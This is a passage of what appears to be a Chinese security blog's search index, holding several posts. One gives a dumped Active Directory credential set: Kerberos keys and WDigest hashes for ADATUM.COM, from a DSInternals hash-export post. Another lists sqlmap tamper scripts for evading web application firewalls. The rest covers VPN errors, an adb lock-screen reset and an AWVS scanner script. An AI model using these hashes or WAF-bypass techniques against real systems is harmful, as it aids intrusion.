Key: a72c8bc96c4a6f03244f0b0067a1e440 Iterations: 4096 DES_CBC_MD5 Key: 76fe3b5bda911a40 Iterations: 4096 OldCredentials: AES256_CTS_HMAC_SHA1_96 Key: 14e46244a59a37cd8aa7c1fe61896441c7d065fafe4874191e69c1fe28856810 Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: 034b512ec64286dec951d6aff8d81fa8 Iterations: 4096 DES_CBC_MD5 Key: 7f8c4f38e0ea0b80 Iterations: 4096 OlderCredentials: AES256_CTS_HMAC_SHA1_96 Key: 2387ca8f936c8c154996809af8fee7c47fe4b9b5dd84d051fc43a9289bbaa3ab Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: 29d536ec057f9063747161429b81f056 Iterations: 4096 DES_CBC_MD5 Key: 58f1cbe6e50e1f83 Iterations: 4096 ServiceCredentials: Salt: ADATUM.COMApril DefaultIterationCount: 4096 Flags: 0 WDigest: Hash 01: c3d012ab1101eb8f51b483fb4c5f8a7e Hash 02: c993da396914645b356ae7816251fcb1 Hash 03: 6b58530cab34de91189a603e22c2be15 Hash 04: c3d012ab1101eb8f51b483fb4c5f8a7e Hash 05: 5a762cf59fa31023dcba1ebd4725b443 Hash 06: c78bac91c0ba25cae5d44460fd65a73b Hash 07: 59d73cea16afd1aac6bf8acfa2768621 Hash 08: d2be383db9469a39736d9e2136054131 Hash 09: 079de9f4d94d97a80f1726497dfd1cc2 Hash 10: 85dbe1549d5fbfcc91f7fe5ac5910f52 Hash 11: 961a36bded5535b8fc15b4b8e6c48b93 Hash 12: 6ac8a60d83e9ae67c2097db716a6af17 Hash 13: e899e577d5f81ef5288ab67de07fad9a Hash 14: 135452ab86d40c3d47ca849646d5e176 Hash 15: a84c367eaa334d0a4cb98e36da011e0f Hash 16: 61a458eb70440b1a92639452f0c2c948 Hash 17: 238f4059776c3575be534afb46be4ccf Hash 18: 03ddf370064c544e9c6dbb6ccbf8f4ac Hash 19: 354dd6c77ccf35f63e48cd5af6473ccf Hash 20: 5f9800d734ebe9fb588def6aaafc40b7 Hash 21: 59aab99ebcddcbf13b96d75bb7a731e3 Hash 22: f1685383b0c131035ae264ee5bd24a8d Hash 23: 3119e42886b01cad00347e72d0cee594 Hash 24: ebef7f2c730e17ded8cba1ed20122602 Hash 25: 7d99673c9895e0b9c484e430578ee78e Hash 26: e1e20982753c6a1140c1a8241b23b9ea Hash 27: e5ec1c63e0e549e49cda218bc3752051 Hash 28: 26f2d85f7513d73dd93ab3afd2d90cf6 Hash 29: 84010d657e6b58ce233fae2bd7644222 参考文章 DSInternals 利用Powershell快速导出域控所有用户Hash]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>域HASH,NTLMHASH,内网渗透,DSInternals</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[微软输入法英文变大空格修复办法]]></title>
+    <url>%2F2019%2F08%2F18%2Fmicrosoft-Input-English-Becomebigger%2F</url>
+    <content type="text"><![CDATA[简述日常使用键盘输入过程中，可能误操作或触发到某快捷键导致输入法在英文状态下输入英文会变大有空格间距，来回输入法关闭切换实在让人头疼，谷歌、bing一波找到解决办法，因该问题遇见多次留个笔记以防以后忘记。 修复方法桌面右下角在中字鼠标右键–&gt;选中全半角(半角)(W)–&gt;选择半角(H) 如图 并且加上快捷键会非常秒哦 桌面右下角在中字鼠标右键–&gt;快捷键设置(K)–&gt; Shift + 空格 如图]]></content>
+      <categories>
+        <category>技术问题解答</category>
+      </categories>
+      <tags>
+        <tag>win10</tag>
+        <tag>输入法英文变大空格</tag>
+        <tag>微软输入法</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Kali Linux更新签名无效错误]]></title>
+    <url>%2F2018%2F04%2F26%2Fkali-repositories-Invalid-signature%2F</url>
+    <content type="text"><![CDATA[错误回显结果123456789root@kali:~# apt-get updateGet:1 http://mirrors.neusoft.edu.cn/kali kali-rolling InRelease [30.5 kB]Err:1 http://mirrors.neusoft.edu.cn/kali kali-rolling InRelease The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;Fetched 30.5 kB in 2s (10.4 kB/s)Reading package lists... DoneW: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://mirrors.neusoft.edu.cn/kali kali-rolling InRelease: The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;W: Failed to fetch http://http.kali.org/kali/dists/kali-rolling/InRelease The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;W: Some index files failed to download. They have been ignored, or old ones used instead. 修复命令12root@kali:~# wget -q -O - https://archive.kali.org/archive-key.asc | apt-key addOK apt-get clean apt-get update 参考文章*The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository]]></content>
+      <categories>
+        <category>技术问题解答</category>
+      </categories>
+      <tags>
+        <tag>KaliLinux更新报错</tag>
+        <tag>ED444FF07D8D0BF6</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[命令行获取域内登陆记录]]></title>
+    <url>%2F2017%2F10%2F25%2Fcommandline-query-domainloginlogon%2F</url>
+    <content type="text"><![CDATA[Cmd输入如下命令1echo %date%,%time%,%computername%,%username%,%sessionname%,%logonserver% 写入txt1echo %date%,%time%,%computername%,%username%,%sessionname%,%logonserver% &gt;&gt; logonserver.txt]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>登陆记录查询</tag>
+        <tag>内网</tag>
+        <tag>域控</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[使用sqlmap tamper脚本绕过waf]]></title>
+    <url>%2F2017%2F10%2F01%2Fsqlmap-bypass-waf%2F</url>
+    <content type="text"><![CDATA[简述WAF（Web应用防火墙）已经成为标准安全解决方案之一。正因为如此，很多公司都不关心甚至有Web应用漏洞。不幸的是，并不是所有的都是无边无线的绕过！本文将告诉您如何在SQLMap旁路WAF / IDS上使用篡改脚本。 篡改脚本将修改请求以避免检测WAF规则。很多时候，您需要使用多个篡改脚本。 例如：如果您使用“space2hash.py”和“space2morehash.py”篡改脚本，这些脚本将自动将所有空格转换为随机注释，并扩展此脚本的版本（space2morehash.py）将帮助您“破坏”功能绕过WAF。输入：1 AND 1234 = 1234输出：1％23PTTmJopxdWJ％0AAND％23cWfcVRPV％0A1234 = 1234 使用方法要在sqlmap上使用篡改脚本，请使用-tamper标志: tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor 要测试mssql，您可以使用以下所有篡改： tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes 以下是支持mssql和mysql的篡改列表： tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes]]></content>
+      <categories>
+        <category>技术问题解答</category>
+      </categories>
+      <tags>
+        <tag>sqlmap</tag>
+        <tag>bypasswaf</tag>
+        <tag>绕过waf</tag>
+        <tag>sqlmaptamper</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[海马玩模拟器密码清除]]></title>
+    <url>%2F2017%2F09%2F24%2Fhaimawan-reset-pass%2F</url>
+    <content type="text"><![CDATA[简述海马玩模拟器是一款可以在电脑运行的安卓模拟器,由于某天需要在海马玩模拟器链接VPN,强制需要设置锁屏密码,过几天再用发现密码忘记了,于是翻资料找解决方法. 步骤1.打开海马玩模拟器默认安装目录win32：”C:\Program Files\Droid4X” Win64：”C:\Program Files (x86)\Droid4X”2.快捷键win + r启动运行,输入CMD回车进入命令管理窗口,并输入”cd C:\Program Files (x86)\Droid4X”切换到海马玩模拟器安装目录3.输入”adb devices”回车,返回信息如下: 123C:\Program Files (x86)\Droid4X&gt;adb devicesList of devices attached127.0.0.1:26944 device 请关闭模拟器或断开多余的USB成功的返回信息: 1234C:\Program Files (x86)\Droid4X&gt;adb devices* daemon not running. starting it now on port 5037 ** daemon started successfully *List of devices attached 4.打开海马玩模拟器5.在刚刚的命令行输入”adb -s 127.0.0.1:26944 shell rm -r -f /data/system/*.key”删除模拟器的密码wenjian,并回车,没有任何返回信息即成功.5.返回海马玩模拟器,点击密码框,回车即可进入系统. 结语步骤不算多,能真正解决问题即可生活就是为了不断的去尝试和折腾,不去尝试怎么知道你就不能做呢?]]></content>
+      <categories>
+        <category>技术问题解答</category>
+      </categories>
+      <tags>
+        <tag>安卓模拟器</tag>
+        <tag>海马玩模拟器</tag>
+        <tag>密码清除</tag>
+        <tag>adb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[vpn常见问题]]></title>
+    <url>%2F2017%2F09%2F21%2Fvpn-faq%2F</url>
+    <content type="text"><![CDATA[简述在日常使用Vpn中会出现各种问题,下面我将列出一些常见问题的解决方法. 解决办法VPN连接频繁掉线，无法连接服务器运营商会随机干扰某些协议VPN端口，遇到这种情况时，请切换到其它协议使用即可。 错误 789/768 解决方法1,点击 开始;2,选择 控制面板3,选择 管理工具，如果没有看到管理工具的选项，请在左上角，选择 经典视图;4,选择服务，并查找 IPSec Service，在”属性”中设置”启动类型”为”自动”并启动服务.（Win7/8下的服务名叫：IPSec Policy Agent） 错误 628/629/734 解决方法出现这样的错误是加密模式选择错误。请点击VPN→属性→安全→数据加密 在这个选项里，选择为可选加密，如果有看到MS-CHAPV2选项，请选中。保存设置，再连接，就可以了 错误 868 解决方法这种情况有2种原因：由于本地网络的DNS服务器无法正确解析境外域名造成的。你需要将本地连接或无线连接的DNS服务器设置为208.67.222.222和8.8.8.8才能正确解析的（或者使用 114.114.114.114）。服务器地址填写错误，VPN服务器地址（Internet地址）请在VPN提供商服务器列表里查看，建议使用域名连接。 错误 691 解决方法帐号填写错误,请确认帐号/密码是否填写正确，密码区分大小写；是否使用相应套餐可用服务器；帐号是否到期； 错误 651 解决办法1.服务器人数已满；2.由于网络响应不及时，用户连续点击“连接”造成操作上的失误。3.连接VPN时，当调制解调器(或其它连接设备)报告了一个错误，此时提示VPN错误称为VPN错误651。 VPN错误651处理方法: 1.如果是服务器人数已满,请换其他服务器进行连接；或者是你连接次数过多,导致无法正常跟服务器连接,请稍等两分钟再连接，或者重启下电脑。2.如果是由于网络响应不及时，用户连续点击“连接”造成操作上的失误。关闭客户端软件，稍等片刻重新启动软件连接即可。3.如果在网吧，请重启计算机，如果还解决不了联系网管。4.虚拟网卡出现问题。解决办法重装虚拟机。5.调制解调器出现故障。右击网上邻居属性，先暂时本地禁用一下，然后再启用本地，然后你把调制解调器的驱动卸载再重装一次，然后把你原来设置的拨号删除，重新再建一个，然后再次连接。 错误 721 解决办法vpn错误721是电脑产生所导致的错误。 或者可以这样理解远程计算机没有响应。如果是从VPN商购买VPN，当登陆的购买VPN连接器时提示错误721时，直接联系VPN商解决。 通常地常见VPN错误721有以下两个； 1、 由于客户端电脑在局域网中并通过路由器上网所致。通熟点说是你本地路由问题。 主要原因是：VPN721错误是由于您的电脑处在您的电脑的上网方式是通过局域网中的路由器上网的造成的。例如：您的电脑是通过局域网中的路由器上网，在 局域网中就可能存在多台电脑，服务器就无法正确判断具体是哪台电脑（由于内网所有电脑的IP地址都是一样的），所以连接时会提示错误721。2、该错误是由于客户端电脑跟服务器使用不同宽带服务商之间的直接互访问题所致。这个主要指的是网络宽带商的问题，一般的话是铁通宽带、长城宽带才会发生类似的问题；反之，是网通宽带、电信宽带很少出现这样的情况； 常见VPN错误721解决方法 1.单击“开始”，然后单击“运行”。2.在“打开”框中，键入 regedit，然后单击“确定”。3.在注册表编辑器中，找到以下子项 1HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\&#123;4D36E972-E325-11CE-BFC1-08002bE10318&#125;\&lt;000x&gt; 其中 &lt;000x&gt; 是 WAN 微型端口 (PPTP) 驱动程序的网络适配器。4.在“编辑”菜单上，指向“新建”，然后单击“DWORD 值”。5.键入 ValidateAddress，然后按 Enter。该值的默认设置为“1”（打开）；因此，您可以通过将其设置为“0”将其关闭。6.退出注册表编辑器。7.重新启动计算机。 错误 720 解决办法vpn错误720定义是无法建立与远程计算机的连接。您可能需要更改此连接的网络设置。也可以简单理解成VPN服务器问题。vpn错误720处理方法：1.可能服务器问题，非用户问题，请向管理员反映；可能是服务器人过多，你可以尝试多连几次。2.看看你电脑或者VPN服务器宽带连接是否正常。3.还有另一种解决方法，重装TCP/IP协议:（1）、开始——运行——regedit.exe，打开注册表编辑器，删除以下两个键： 123HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\WinsockHKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Winsock2 （2）、用记事本打开%winroot%\inf\nettcpip.inf文件，找到：[MS_TCPIP.PrimaryInstall]Characteristics = 0xa0 &lt;――――――把此处的0Xa0改为0x80 保存退出（3）、打开本地连接的TCP/IP属性――-添加协议——从磁盘——浏览找到刚刚保存的 nettcpip.inf(%winroot%\inf\nettcpip.inf)文件，然后选择“TCP/IP协议”（不是选择那个TCP/IP 版本6）。经过这一步之后，又返回网络连接的窗口，但这个时候，那个“卸载”按钮已经是可用的了。点这个 “卸载”按钮来把TCP/IP协议删除，然后重启一次机器。（4）、重启后再照着第3步，重新安装一次TCP/IP协议便可。（5）、再重启一次，这时应该可以了，可以照着需要，设置一下IP地址。 错误 769 解决办法1.确保网络电缆已连接。即保证自己电脑可以顺利上网。2.网络连接是否禁用。首先打开“我的电脑”→“控制面版”→“网络连接”，查看本地连接的是否处在 “禁用”状态，是的话只需双击本地连接，看到状态变为“已启用”即可。3.网卡问题。若是连本地连接都没有的话，绝大部分情况是你网卡有问题；此时请检查网卡装好了没或网卡坏了。如果是网卡没装好重装即可。 如果是网卡坏了即时更换。例如：电脑中毒，把病毒删除之后出现VPN错误769代码，此时卸载网卡，重新搜索新硬件。重装网卡即可。4.当本地能上网而连接不上VPN服务器。原因是当本机能上网并不代表你一定能连接到指定的VPN服务器，此时可以ping对应VPN服务器IP，如果 ping得通证明服务器没问题即可以连接上。导致的原因有VPN服务器没有开启或者你的电脑防火墙阻挡住VPN连接导致无法连接到目标。5.硬件问题。例如：路由器不支持VPN，不过现在比较少，或者路由器自带防火墙阻挡了。注意：出现VPN错误769代码，绝大多数是网卡被禁用，此时启用即可！造成的原因一般为：用户的误操作或一些防火墙软件、计算机病毒引起的。如果没有找到本地连接，一般是网卡的驱动程序丢了或计算机没有检测到网卡，此时需要重新安装即可。 错误 650 解决办法在建立VPN时，远程计算机没有响应，断开连接，此时通常出现VPN错误650。出现VPN错误650的原因：ADSL ISP服务器故障，网卡故障，非正常关机造成网络协议导致出错。VPN错误650解决办法：检查ADSL信号灯是否能正确同步，检查网卡，删除所有网络组件重新安装网络。 错误 711 解决办法v PN 错误711，导致原因相关服务没有开启,一般可以查阅以下3个服务Telephony、 Remote Access Connection Manager 、Remote Access Auto Connection Manager.这是Win7电脑系统里面算是一个比较常见的问题:VPN错误711导致的原因：1.检查网卡是否装好,重新安装网卡驱动；同时重新设置网络拨号连接。2.检查下列服务是否被禁用了,如果被禁，将其改为手动。Telephony(电话服务)Remote Access Connection Manager(远程访问连接管理器)Remote Access Auto Connection Manager(远程访问自动连接管理器)3.用管理员账号登陆，再打开C：\windows\system32\logfiles ，找到 wmi文件夹，在wmi文件夹上点右键，点选 获取管理员权限 ,重启即可修复。4.开始-运行-输入 CMD -确定-在命令符后输入netsh winsock reset -回车，重启。5.更改计算机名称。右击计算机－属性－高级系统设置－计算机名－更改－把更改里的计算机名改一个简短的，比如 china -确定。6.换个系统版本重装系统。 vpn错误711解决方法： 1.启动Remote Access Connection Manager与Network Connections与Telephony服务。2.启动方法一：开始-&gt;运行-&gt;在里面输入：services.msc -&gt;（双击）Remote Access Connection Manager与Network Connections与Telephony -&gt;启动这三项服务3.启动方法二：新建一个文本文件（后缀为.txt）的文件，将下面的内容复制进去： 123456789@echo开启VPN执行环境必要系统服务@pausesc config TapiSrv start= AUTOsc config Netman start= AUTOsc config RasMan start= AUTONet start TapiSrvNet start RasManNet start Netman@pause 点击菜单-&gt;文件-&gt;另存为；文件类型选“所有文件”；文件名“服务.bat”；保存好后双击“服务.bat”，即可完成系统服务设置。 错误 634 解决办法远程访问VPN服务器不能在网络上注册你的计算机名称，这一般随着NetBIOS协议一起出现，但也可能随着tcp/ip或者ipx一起出现。通常，当地址已经在网络上使用时，会发生vpn错误634。如果对这方面不是很专业的请与系统管理员联系处理vpn错误634。 错误 678 解决办法1.可能是vpn服务器人数过多，请尝试多连接几次 ；2.可能是你装反了客户端，请重新安装客户端；3.从上面定义不难看出，调制解调器或其他设备故障，检查号码，再拨号。如果是虚拟专用网络 (VPN) 连接，则检查目标服务器的主机名或 IP 地址，然后再次尝试连接。还要确保电话线(网线)插在调制解调器（网卡）的正确插槽中。4.VPN pptp远程拨号错误678；5.如果您是购买VPN用户直接联系商家解决； 错误 619 解决办法vpn错误619是指端口已断开连接。也可以理解成已经断开了VPN连接。 vpn错误619原因以及解决办法: 1.vpn错误619；这种情况大数多原因为多人连接VPN服务器异常中断，因绝大部分VPN服务器限制一个帐户同时只有一个人使用，所以一般来说一个VPN账号只能一个人使用，多人登陆就会出现这种情况。解决办法：VPN只能一个人登陆VPN连接器。以下vpn错误619两点基本是商家需要解决的，如果以上第一点排除之外普通VPN用户直接联系商家解决即可；2.这种情况大数多原因为客户机连接Internet的网关（如家庭宽带路由或公司上网网关路由或防火墙）NAT-T功能关闭或对VPN支持性不好，主要是对GRE及PPTP协议的NAT-T不支持。解决办法：打开网关路由的NAT-T功能，如果还是出现错误，则需要更换网关设备，现在大多数设备已经支持。3.（这点是VPN服务商的问题）有些VPN服务器没有设置异常断线检查功能也可能导致用户一旦异常断开后很长时间不能连接。解决办法：在服务器上设置异常断线检查程序或功能。 错误 800 解决办法vpn错误800是指不能建立VPN连接，VPN服务器可能不能到达，或者此连接的安全参数没有正确配置。 VPN800错误解决方法： 一般来说你如果是购买VPN用户的话，无需下面的步骤，直接联系VPN提供商解决即可。1.IP错误。检查配置中的“目的地的主机名或IP地址”使用的是域名而不是IP地址，由于VPN隧道需要定期进行维护，我们有可能变更VPN隧道服务器的IP地址，但域名不会改变。2.您所在网络与我们的VPN隧道服务器没有正确的通道，请尝试更换配置中的“目的地的主机名或IP地址”，将其调整为我们的登陆服务器IP地址或者域名。3.临时性故障，（如果您是用户联系VPN商家解决即可）多半是由于DNS服务器繁忙无法对服务器IP地址，或者域名的名字进行解析所引起，可以使用以下操 作：开始-&gt;运行-&gt;打开：cmd-&gt;确定，执行命令ipconfig /flushdns后再进行VPN连接尝试。4.重启 电脑，删除原来建好的，重新一个新的VPN连接。 由于配置异常造成的无法连接，虽然用户没有做过任何的配置修改，但由于系统内部的故障会导致配置（注册表信息）出现异常，这是Windows系统中常见的 问题。 处理方法是删除原VPN隧道连接的配置，重新建立一个新的VPN隧道连接即可。5.检查连接的安全参数配置与配置要求一致。6.防火墙太严。您机器上的防火墙规则设置过于严格，导致无法对外进行连接，请调整或关闭所有防火墙再进行尝试。7.如果有安装家庭网关的用户，也建议重启一下家庭网关设备。 错误 756 解决办法在连接VPN代理时，VPN连接正在运行，但无法正常连接称为VPN错误756一般咱们发现提示的错误为：VPN错误756,已经拨了这个连接。但有时一开始会伴随出现VPN错误800或者VPN错误619的发生。 VPN错误756原因可能由以下几点造成的： 1.在连这个VPN之前，可能已连接了另一个连接，但没有正常有效断开关闭。2.这个VPN的帐号未正关闭，已经或仍在使用中。就像家里ADSL帐号没正常关闭,挂着，马上再连就连不上了,隔一会连接就OK了。解决方法如下:1.重启下电脑；如果电脑不能有效关闭先前的VPN连接，此时重启下电脑。2.重启路由器。3.也有可能是这种情况多数为VISTA或者windows 7系统用户，解决方法为：请用鼠标右键点软件，选择“以管理员身份运行”即可。 当系统为XP，出现VPN错误756是因为你在登陆过程中非正常中断，导致账号连接出现错误，出现这种情况最好的办法就是：点击网上邻居—–反键—–属性 —–虚拟网络 ，在虚拟网络里面看到 VPN网络连接断开 ，删除后重启计算机，然后再连接；如果无法删除，直接重启计算机，然后再删除后连接。 结语在使用VPN时很多问题会导致其无法正常使用,以上方法仅供参考.]]></content>
+      <categories>
+        <category>技术问题解答</category>
+      </categories>
+      <tags>
+        <tag>Vpn常见问题</tag>
+        <tag>win10vpn</tag>
+        <tag>win8vpn</tag>
+        <tag>win7vpn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[手工查看当前网站的HTTPSERVER信息]]></title>
+    <url>%2F2017%2F09%2F20%2Flook-httpserver-method%2F</url>
+    <content type="text"><![CDATA[简述 HTTPSERVER是每个网站搭建所用的web容器标识,例如常见:IIS、Apache、Nginx,今天教大家如何手工利用谷歌浏览器查看。 手工具体步骤1、打开谷歌浏览器 2、地址栏输入”www.shouyihuo.com&quot;,这个Url是我随便找的 3、在页面空白处鼠标右键-检查/审查元素,然后网页页面的右边会弹出一个栏目 4、为了方便查看点击栏目x旁边竖着三个点，然后点击倒数第三个”Dock to boottom” 5、栏目就会到网页页面下方,在栏目菜单栏选择第三个”Network”浏览器刷新页面就会有一堆Url参数 6、我一般选择第一个链接点击进去,就可以看到当前Url的HTTPSERVER信息 结语此方法可以在所有浏览器使用,但是在操作步骤可能略有不同.]]></content>
+      <categories>
+        <category>技术问题解答</category>
+      </categories>
+      <tags>
+        <tag>浏览器</tag>
+        <tag>httpserver信息</tag>
+        <tag>网站</tag>
+        <tag>chrome</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[AWVS各类脚本]]></title>
+    <url>%2F2017%2F09%2F18%2Facunetix-web-vulnerability-scanner-11%2F</url>
+    <content type="text"><![CDATA[简述Acunetix Web Vulnerability Scanner是一个网站及服务器漏洞扫描软件，它包含有收费和免费两种版本。 启动&amp;停止脚本 下面代码复制另存为awvs.bat 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556@echo offmode con lines=30 cols=60clscolor 2fecho.-----------------------------------------------------------echo.请选择使用：echo.echo. 1.启动Awvs 11（即在下面输入1）echo.echo. 2.停止Awvs 11（即在下面输入2）echo.-----------------------------------------------------------if exist "%SystemRoot%\System32\choice.exe" goto Win7Choiceset /p choice=请输入数字并按回车键确认:echo.if %choice%==1 goto StartAwvsif %choice%==2 goto StopAwvscls"set choice="echo 您输入有误，请重新选择。goto main:Win7Choicechoice /c 12 /n /m "请输入相应数字："if errorlevel 2 goto StopAwvsif errorlevel 1 goto StartAwvsclsgoto main:StartAwvsclscolor 2fnet start Acunetixnet start "Acunetix Database"echo.-----------------------------------------------------------echo.echo 成功启动 "Acunetix"，"Acunetix Database" 服务！echo.goto end:StopAwvsclscolor 2fnet stop Acunetixnet stop "Acunetix Database"echo.-----------------------------------------------------------echo.echo 成功关闭 "Acunetix"，"Acunetix Database" 服务！echo.goto end:endecho 请按任意键退出。@Pause&gt;nul 批量添加扫描URL 该脚本为Python语言,使用前请安装Python. 1、将下列代码复制另存为”awvs11批量扫描删除.py” 2、全文搜索localhost:3443,全部替换为你awvs所在的服务器及端口 3、username填你的账户名,pw填你的密码,是sha256加密后的密码 4、把要添加的url列表保存成testawvs.txt文件，放在该脚本所在目录运行该脚本。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162#-*- coding:utf-8 -*-import urllib2import sslimport json__author="jamesj"#localhost:3443全部替换为awvs所在的服务器及端口username='mail@mail.com'#账号邮箱pw='sha256加密后的密码'#sha256加密后的密码，通过burp抓包可获取,也可以使用(http://tool.oschina.net/encrypt?type=2)把密码进行加密之后填入，请区分大小写、中英文字符。#以上内容为配置内容，然后把要添加的url列表保存成testawvs.txt文件，放在该脚本下运行该脚本。ssl._create_default_https_context = ssl._create_unverified_contexturl_login="https://localhost:3443/api/v1/me/login"send_headers_login=&#123;'Host': 'localhost:3443','Accept': 'application/json, text/plain, */*','Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3','Accept-Encoding': 'gzip, deflate, br','Content-Type': 'application/json;charset=utf-8'&#125;data_login='&#123;"email":"'+username+'","password":"'+pw+'","remember_me":false&#125;'req_login = urllib2.Request(url_login,headers=send_headers_login)response_login = urllib2.urlopen(req_login,data_login)xauth = response_login.headers['X-Auth']COOOOOOOOkie = response_login.headers['Set-Cookie']print "当前验证信息如下\r\n cookie : %r \r\n X-Auth : %r "%(COOOOOOOOkie,xauth)send_headers2=&#123; 'Host':'localhost:3443', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Content-Type':'application/json;charset=utf-8', 'X-Auth':xauth, 'Cookie':COOOOOOOOkie &#125;#以上代码实现登录（获取cookie）和校验值def add_exec_scan(): url="https://localhost:3443/api/v1/targets" try: urllist=open('testawvs.txt','r')#这是要添加的url列表 formaturl=urllist.readlines() for i in formaturl: target_url='http://'+i.strip() data='&#123;"description":"222","address":"'+target_url+'","criticality":"10"&#125;' #data = urllib.urlencode(data)由于使用json格式所以不用添加 req = urllib2.Request(url,headers=send_headers2) response = urllib2.urlopen(req,data) jo=json.loads(response.read()) target_id=jo['target_id']#获取添加后的任务ID #print target_id #以上代码实现批量添加 url_scan="https://localhost:3443/api/v1/scans" headers_scan=&#123; 'Host': 'localhost:3443', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate, br', 'Content-Type': 'application/json;charset=utf-8', 'X-Auth':xauth, 'Cookie':COOOOOOOOkie, &#125; data_scan='&#123;"target_id":'+'\"'+target_id+'\"'+',"profile_id":"11111111-1111-1111-1111-111111111111","schedule":&#123;"disable":false,"start_date":null,"time_sensitive":false&#125;,"ui_session_id":"66666666666666666666666666666666"&#125;' req_scan=urllib2.Request(url_scan,headers=headers_scan) response_scan=urllib2.urlopen(req_scan,data_scan) print response_scan.read()+"添加成功！" #以上代码实现批量加入扫描 urllist.close() except Exception,e: print edef count(): url_count="https://localhost:3443/api/v1/notifications/count" req_count=urllib2.Request(url_count,headers=send_headers2) response_count=urllib2.urlopen(req_count) print "当前存在%r个通知！" % json.loads(response_count.read())['count'] print "-" * 50 print "已存在以下任务" url_info="https://localhost:3443/api/v1/scans" req_info=urllib2.Request(url_info,headers=send_headers2) response_info=urllib2.urlopen(req_info) all_info = json.loads(response_info.read()) num = 0 for website in all_info.get("scans"): num+=1 print website.get("target").get("address")+" \r\n target_id:"+website.get("scan_id") print "共 %r个扫描任务" % num #count()#scan、target、notification！def del_scan(): url_info="https://localhost:3443/api/v1/scans" req_info=urllib2.Request(url_info,headers=send_headers2) response_info=urllib2.urlopen(req_info) all_info = json.loads(response_info.read()) counter = 0 for website in all_info.get("scans"): #if (website.get("target").get("description"))== "222": url_scan_del="https://localhost:3443/api/v1/scans/"+str(website.get("scan_id")) req_del = urllib2.Request(url_scan_del,headers=send_headers2) req_del.get_method =lambda: 'DELETE' response_del = urllib2.urlopen(req_del) counter = counter+1 print "已经删除第%r个!" % counter#del_scan() #通过描述判断是否使用扫描器添加扫描器添加的时候设置description=“222”def del_targets(): url_info="https://localhost:3443/api/v1/targets" req_info=urllib2.Request(url_info,headers=send_headers2) response_info=urllib2.urlopen(req_info) all_info = json.loads(response_info.read()) for website in all_info.get("targets"): if (website.get("description"))== "222": url_scan_del="https://localhost:3443/api/v1/targets/"+str(website.get("target_id")) req_del = urllib2.Request(url_scan_del,headers=send_headers2) req_del.get_method =lambda: 'DELETE' response_del = urllib2.urlopen(req_del) print "ok!"#del_targets()if __name__== "__main__": print "*" * 20 count() print "1、使用testawvs.txt添加扫描任务并执行请输入1，然后回车\r\n2、删除所有使用该脚本添加的任务请输入2，然后回车\r\n3、删除所有任务请输入3，然后回车\r\n4、查看已存在任务请输入4，然后回车\r\n" choice = raw_input("&gt;")# print type(choice) if choice =="1": add_exec_scan() count() elif choice =="2": del_targets() count() elif choice =="3": del_scan() count() elif choice =="4": count() else: print "请重新运行并请输入1、2、3、4选择。"#下图的注释信息是删除通知。。""" counter= 0 for website in all_info.get("notifications"): if (website["data"].get("address")== "www.ly.com"): counter = counter + 1 url_del = "https://localhost:3443/api/v1/scans/"+str(website["data"].get("scan_id")) print url_del#print url_del req_del = urllib2.Request(url_del,headers=send_headers2) #DELETE方法 try: req_del.get_method = lambda:"DELETE" response1 = urllib2.urlopen(req_del) except: print "error" continue print counter #print response1.read() #for address in need_info["address"] # if addressdel_all()""" 点我下载awvs集合脚本 参考 awvs 11一键启动-停止脚本 awvs11批量添加扫描\删除小脚本]]></content>
+      <categories>
+        <category>神兵利器</category>
+      </categories>
+      <tags>
+        <tag>acunetix web vulnerability scanner 11</tag>
+        <tag>awvs11破解版版</tag>
+        <tag>awvs11启动停止脚本</tag>
+        <tag>awvs11批量扫描脚本</tag>
+        <tag>漏洞扫描工具</tag>
+        <tag>批处理脚本</tag>
